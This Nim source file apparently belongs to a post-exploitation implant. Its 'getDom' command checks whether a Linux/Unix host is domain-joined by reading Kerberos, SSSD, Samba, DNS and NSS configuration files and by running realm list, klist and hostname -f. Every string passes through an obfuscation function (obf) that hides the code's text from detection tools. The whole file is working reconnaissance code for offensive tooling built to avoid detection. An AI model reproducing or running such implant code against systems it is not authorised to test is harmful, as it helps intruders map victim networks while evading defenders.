#[
    Cross-Platform getDom Command
    Get domain information on Linux/Unix systems
    Adapted from Windows version for Unix-like systems
]#

import osproc, strutils, os
import ../../util/strenc

proc getDom*(): string =
    try:
        var domainInfo: seq[string] = @[]
        
        when defined verbose:
            echo obf("DEBUG: Gathering domain information...")
        
        # Check if system is domain-joined (various methods)
        
        # Method 1: Check /etc/krb5.conf for Kerberos realm
        try:
            if fileExists("/etc/krb5.conf"):
                let krb5Content = readFile("/etc/krb5.conf").toLowerAscii()
                if "default_realm" in krb5Content:
                    domainInfo.add(obf("Kerberos: /etc/krb5.conf found with realm configuration"))
        except:
            discard
        
        # Method 2: Check SSSD configuration
        try:
            if fileExists("/etc/sssd/sssd.conf"):
                domainInfo.add(obf("SSSD: Domain service configured"))
        except:
            discard
        
        # Method 3: Check Samba domain membership
        try:
            if fileExists("/etc/samba/smb.conf"):
                let sambaContent = readFile("/etc/samba/smb.conf").toLowerAscii()
                if "workgroup" in sambaContent or "domain" in sambaContent:
                    domainInfo.add(obf("Samba: Domain configuration found"))
        except:
            discard
        
        # Method 4: Check for domain controllers in resolv.conf
        try:
            if fileExists("/etc/resolv.conf"):
                let resolvContent = readFile("/etc/resolv.conf")
                if ".local" in resolvContent or "domain" in resolvContent:
                    domainInfo.add(obf("DNS: Domain configuration in resolv.conf"))
        except:
            discard
        
        # Method 5: Check realm command (if available)
        try:
            let realmOutput = execProcess("realm list").strip()
            if realmOutput.len > 0 and "No realms discovered" notin realmOutput:
                domainInfo.add(obf("Realm: ") & realmOutput.split('\n')[0])
        except:
            discard
        
        # Method 6: Check kinit for current user tickets
        try:
            let kinitOutput = execProcess("klist").strip()
            if "Default principal:" in kinitOutput:
                domainInfo.add(obf("Kerberos: Active tickets found"))
        except:
            discard
        
        # Method 7: Check hostname for domain
        try:
            let hostname = execProcess("hostname -f").strip()
            if "." in hostname and hostname.count('.') >= 2:
                domainInfo.add(obf("Hostname: FQDN detected - ") & hostname)
        except:
            discard
        
        # Method 8: Check nsswitch.conf for domain authentication
        try:
            if fileExists("/etc/nsswitch.conf"):
                let nssContent = readFile("/etc/nsswitch.conf").toLowerAscii()
                if "sss" in nssContent or "winbind" in nssContent or "ldap" in nssContent:
                    domainInfo.add(obf("NSS: Domain authentication configured"))
        except:
            discard
        
        when defined verbose:
            echo obf("DEBUG: Found ") & $domainInfo.len & obf(" domain indicators")
        
        if domainInfo.len > 0:
            return obf("Domain information:\n") & domainInfo.join("\n")
        else:
            return obf("No domain membership detected - appears to be standalone system")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: getDom failed: ") & e.msg
        return obf("ERROR: Domain detection failed - ") & e.msg 